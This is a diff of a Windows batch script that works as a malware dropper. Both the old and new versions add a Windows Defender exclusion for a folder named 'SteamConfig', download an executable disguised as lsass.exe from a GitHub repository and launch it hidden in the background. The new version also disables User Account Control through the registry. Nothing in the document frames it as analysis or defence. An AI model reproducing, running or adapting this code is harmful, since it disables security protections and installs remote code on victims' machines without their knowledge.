@@ -1,40 +1,30 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Set paths
 set "folderPath=%USERPROFILE%\AppData\Local\SteamConfig"
-set "batchScript=%TEMP%\hidden_runner.bat"
-set "vbsScript=%TEMP%\hidden_runner.vbs"
-set "exeFile=%folderPath%\lsass.exe"
-
-:: Create SteamConfig folder if it doesn't exist
 if not exist "%folderPath%" mkdir "%folderPath%"
 
-:: Create the batch script that will run hidden
-(
-    echo @echo off
-    echo setlocal enabledelayedexpansion
-    echo if not exist "%folderPath%" mkdir "%folderPath%"
-    echo powershell -Command "Start-Process powershell -ArgumentList 'Add-MpPreference -ExclusionPath \"%folderPath%\"' -Verb RunAs" ^>nul 2^>^&1
-    echo curl -L -o "%exeFile%" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" ^>nul 2^>^&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
 
-    echo :checkFile
-    echo timeout /t 2 /nobreak ^>nul
-    echo if not exist "%exeFile%" goto checkFile
-    echo for %%%%F in ("%exeFile%") do set "filesize=%%%%~zF"
-    echo if "!filesize!"=="0" (timeout /t 2 /nobreak ^>nul & goto checkFile)
+powershell -Command "Start-Process powershell -ArgumentList 'Add-MpPreference -ExclusionPath \"%folderPath%\"' -Verb RunAs" >nul 2>&1
 
-    :: Run the EXE in the background
-    echo start "" "%exeFile%"
-    echo exit /b 0
-) > "%batchScript%"
+curl -L -o "%folderPath%\lsass.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" >nul 2>&1
+if %errorlevel% neq 0 exit /b 1
 
-:: Create the VBS script to run the batch file silently
-(
-    echo Set objShell = CreateObject("WScript.Shell")
-    echo objShell.Run "cmd.exe /c %batchScript%", 0, False
-) > "%vbsScript%"
+if not exist "%folderPath%\lsass.exe" exit /b 1
+for %%F in ("%folderPath%\lsass.exe") do set filesize=%%~zF
+if "%filesize%"=="0" exit /b 1
 
-:: Run the VBS script
-cscript //nologo "%vbsScript%"
+start "" /b "%folderPath%\lsass.exe"
+exit
+
+:: Create VBScript to run batch silently
+echo Set objShell = CreateObject("WScript.Shell") > "%TEMP%\run_silently.vbs"
+echo objShell.Run """%~f0""", 0, False >> "%TEMP%\run_silently.vbs"
+
+:: Execute the VBScript
+wscript "%TEMP%\run_silently.vbs"
+
+:: Clean up VBScript after execution
+del "%TEMP%\run_silently.vbs"
 exit
